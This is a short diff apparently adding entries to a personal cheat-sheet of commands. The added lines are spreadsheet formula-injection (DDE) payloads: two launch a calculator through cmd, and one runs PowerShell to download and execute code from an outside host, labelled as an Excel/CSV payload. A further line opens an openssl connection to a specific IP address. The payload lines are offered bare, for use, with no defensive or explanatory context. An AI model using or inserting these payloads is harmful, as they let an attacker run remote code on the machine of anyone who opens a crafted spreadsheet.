@@ -168,3 +168,8 @@ tesseract -psm 8 out2.png -
 
 
 
+=cmd|' /C calc'!A0
+@SUM(1+1)*cmd|' /C calc'!A0 
+@SUM(1+1)*cmd|' /C powershell IEX(wget 0r.pe/p)'!A0 //#payload excel csv
+openssl s_client -connect 179.27.35.202:443 //cliente https 
+
